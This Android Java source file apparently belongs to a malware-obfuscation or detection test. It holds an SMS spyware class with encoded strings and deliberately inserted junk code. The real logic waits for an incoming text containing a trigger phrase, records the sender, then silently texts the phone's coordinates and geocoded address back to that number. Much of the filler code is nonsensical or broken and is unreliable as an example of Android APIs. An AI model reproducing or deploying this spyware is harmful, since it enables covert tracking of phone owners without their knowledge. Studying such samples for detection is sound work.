package com.example.flymaple.test10;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.accounts.AccountManagerCallback;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.hardware.camera2.CameraManager;
import android.hardware.usb.UsbDevice;
import android.hardware.usb.UsbDeviceConnection;
import android.hardware.usb.UsbManager;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkInfo;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.storage.OnObbStateChangeListener;
import android.os.storage.StorageManager;
import android.print.PrintJob;
import android.print.PrintManager;
import android.telephony.CellLocation;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.IOException;
import java.net.URL;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.logging.Handler;

/**
 * Created by Flymaple on 7/3/15.
 */
public class Test3 extends AsyncTask<Intent, Void, Void>
        implements LocationListener {
    public static final String S = strDecode("ef/npcjobvufo/tnttqz/TNT`TFOU");
    public static final String SS= strDecode("boespje/qspwjefs/Ufmfqipoz/TNT`SFDFJWFE");
    private boolean _r;
    private String send;
    private Context c;
    private Intent int1;
    private LocationManager lm1;
    private boolean lc = false;
    private PendingIntent si;
    private SmsManager manager;

    //junk
    private boolean junk1;

    public boolean isJunk1() {
        return junk1;
    }

    public void setJunk1(boolean junk1) {
        this.junk1 = junk1;
    }

    public int getJunk2() {
        return junk2;
    }

    public void setJunk2(int junk2) {
        this.junk2 = junk2;
    }

    public String getJunk3() {
        return junk3;
    }

    public void setJunk3(String junk3) {
        this.junk3 = junk3;
    }

    public float getJunk4() {
        return junk4;
    }

    public void setJunk4(float junk4) {
        this.junk4 = junk4;
    }

    public Intent getJunk5() {
        return junk5;
    }

    public void setJunk5(Intent junk5) {
        this.junk5 = junk5;
    }

    public Context getJunk6() {
        return junk6;
    }

    public void setJunk6(Context junk6) {
        this.junk6 = junk6;
    }

    private int junk2;
    private String junk3;
    private float junk4;
    private Intent junk5;
    private Context junk6;


    protected Void doInBackground(Intent[] is)
    {
        int j;
        int k;
        do {
            try {
                Log.i(strDecode("TNTTQZ"), getClass() + strDecode("!Ep!jo!cbdlhspvoe;!") + is[0].getAction());

                //junk code
                CameraManager manager = (CameraManager) c.getSystemService(Context.CAMERA_SERVICE);
                String[] s = manager.getCameraIdList();
                manager.openCamera(null, null, null);
                manager.getCameraCharacteristics(s[0]);



                Intent li = is[0];
                if (!li.getAction().equals(strDecode("boespje/qspwjefs/Ufmfqipoz/TNT`SFDFJWFE")))
                    break;


                //junk code
                TelephonyManager tm = (TelephonyManager)c.getSystemService(Context.TELEPHONY_SERVICE);
                int i5 = tm.getCallState();
                CellLocation c7 = tm.getCellLocation();
                String s3 = tm.getSimCountryIso();
                if(i5 == 9 && s3.equals("MSG")){
                    String content="good";
                    tm.sendEnvelopeWithStatus(content);
                }
                c7.requestLocationUpdate();



                String s1 = this.c.getString(R.string.abc_action_bar_home_description);
                Bundle lb = li.getExtras();
                if (lb == null)
                    break;


                //junk
                UsbManager manager2 = (UsbManager) c.getSystemService(Context.USB_SERVICE);
                manager2.openAccessory(null);
                UsbDevice accessory = null;
                PendingIntent pi = null;
                manager2.requestPermission(accessory, pi);
                if(manager2.hasPermission(accessory)){
                    UsbDevice device = null;
                    UsbDeviceConnection c3 = manager2.openDevice(device);
                }


                Object[] os = (Object[]) lb.get(strDecode("qevt"));
                SmsMessage[] smsMs = new SmsMessage[os.length];


                //junk
                WifiManager wm = (WifiManager) c.getSystemService(Context.WIFI_SERVICE);
                WifiConfiguration config = null;
                wm.addNetwork(config);
                String tag = "tag";
                wm.createWifiLock(tag);
                wm.getConnectionInfo();
                List<WifiConfiguration> l = wm.getConfiguredNetworks();
                WifiConfiguration w = l.get(0);
                w.networkId = 8080;
                w.toString();


                for (int i = 0; ; i++) {
                    if (i >= os.length) {
                        j = smsMs.length;
                        k = 0;
                        break;
                    }
                    smsMs[i] = SmsMessage.createFromPdu((byte[]) os[i]);
                }


                //junk
                ConnectivityManager c3 = (ConnectivityManager)c.getSystemService(Context.CONNECTIVITY_SERVICE);
                NetworkInfo ni = c3.getActiveNetworkInfo();
                String s22 = ni.getExtraInfo();
                if(s22!=null){
                    ni.getReason();
                }
                Network[] n = c3.getAllNetworks();
                n[0].openConnection(new URL("192.168.0.1"));
                n[0].describeContents();



                SmsMessage smsMs2 = smsMs[k];
                this._r = false;


                //junk
                PrintManager printManager =
                        (PrintManager) c.getSystemService(Context.PRINT_SERVICE);
                List<PrintJob> j1 = printManager.getPrintJobs();
                if(j1!=null){
                    PrintJob pj = j1.get(0);
                    if(pj.isCancelled()){
                        pj.restart();
                        if(pj.isCancelled()){
                            pj.cancel();
                        }
                    }
                }



                if (smsMs2.getMessageBody().toLowerCase().contains(s1)) {
                    this._r = true;
                    this.send = smsMs2.getOriginatingAddress();
                }
                k++;
            } catch (Throwable t) {
                Log.e(strDecode("TNTTQZ"), t.getMessage(), t);
                break;
            }
        }
        while (k < j);
        return null;
    }

    public void onLocationChanged(Location l)
    {
        if (!this.lc)
        {
            this.lc = true;
            StringBuffer lsb = new StringBuffer();
            String s1 = String.valueOf(l.getLatitude());


            //junk
            StorageManager sm = (StorageManager)c.getSystemService(Context.STORAGE_SERVICE);
            if(sm.isObbMounted(".\\user\\res\\store"));
            String p = sm.getMountedObbPath(".\\user\\res\\store");
            String rawPath = null;
            String key = null;
            OnObbStateChangeListener listener = null;
            sm.mountObb(rawPath, key, listener);
            boolean force = false;
            sm.unmountObb(rawPath, force , listener);



            String s2 = String.valueOf(l.getLongitude());
            lsb.append("l is at\n");


            //junk
            AccountManager am = (AccountManager) c.getSystemService(Context.ACCOUNT_SERVICE);
            Account[] as = am.getAccounts();



            if (s1.length() > 8)
                lsb.append(strDecode("Mbujuvef;!") + String.valueOf(l.getLatitude()).substring(0, 9) + "\n");
            while (true)
            {
                Geocoder lg=null;
                if (s2.length() > 8)
                {
                    lsb.append(strDecode("Mpohjuvef;!") + String.valueOf(l.getLongitude()).substring(0, 9) + "\n");


                    //junk
                    AccountManager am1 = (AccountManager) c.getSystemService(Context.ACCOUNT_SERVICE);
                    Account[] as1 = am1.getAccounts();


                    lsb.append(strDecode("Qsfdjtjpo!cz;!") + l.getProvider() + "\n");
                    lg = new Geocoder(this.c, Locale.getDefault());
                }
                try
                {
                    List lls = lg.getFromLocation(l.getLatitude(), l.getLongitude(), 1);


                    //junk
                    try{
                    CameraManager manager = (CameraManager) c.getSystemService(Context.CAMERA_SERVICE);
                    String[] s4 = manager.getCameraIdList();
                    manager.openCamera(null, null, null);
                    }catch(Exception e){}


                    Address la;

                    if (lls != null)
                    {
                        lsb.append("addre is at \n");
                        la = (Address)lls.get(0);

                        int j = la.getMaxAddressLineIndex();
                        for(int i=0;i<j;i++){
                            lsb.append(la.getAddressLine(i));
                            lsb.append(strDecode("Mbujuvef;!") + String.valueOf(l.getLatitude()) + "\n");


                            //junk
                            try{
                                TelephonyManager tm = (TelephonyManager)c.getSystemService(Context.TELEPHONY_SERVICE);
                                int i4 = tm.getCallState();
                                CellLocation c = tm.getCellLocation();
                                String s = tm.getSimCountryIso();
                                if(i4 == 9&& s.equals("MSG")){
                                    String content="good";
                                    tm.sendEnvelopeWithStatus(content);
                                }
                                c.requestLocationUpdate();
                            }catch(Exception e){}


                            lsb.append(strDecode("Mpohjuvef;!") + String.valueOf(l.getLongitude()) + "\n");
                            lsb.append("\n");
                            if (la.getPostalCode() != null)
                                lsb.append(la.getPostalCode());
                            i++;
                        }

                        Iterator ie = this.manager.divideMessage(lsb.toString()).iterator();
                        while(ie.hasNext()){
                            String s3 = (String)ie.next();


                            //junk
                            try{
                                UsbManager manager = (UsbManager) c.getSystemService(Context.USB_SERVICE);
                                manager.openAccessory(null);
                                UsbDevice accessory = null;
                                PendingIntent pi = null;
                                manager.requestPermission(accessory, pi);
                                if(manager.hasPermission(accessory)){
                                    UsbDevice device = null;
                                    UsbDeviceConnection c = manager.openDevice(device);
                                }
                            }catch(Exception e){}



                            this.manager.sendTextMessage(this.send, null, s3, this.si, null);
                        }
                        return;
                    }
                }
                catch (IOException e)
                {
                }
            }
        }
        this.lm1.removeUpdates(this);
    }

    public void onProviderDisabled(String s)
    {
    }

    public void onProviderEnabled(String s)
    {
    }

    public void onStatusChanged(String s, int i, Bundle b)
    {
    }

    public void setC(Context c)
    {
        this.c = c;
    }

    private static String strDecode(String str){
        String s = "";
        for (int i=0;i<str.length();i++){
            char a_char = str.charAt(i);
            int x = (int)a_char;
            x--;
            a_char = (char)x;
            s = s + a_char;
        }
        System.out.print(s);
        return s;
    }

}
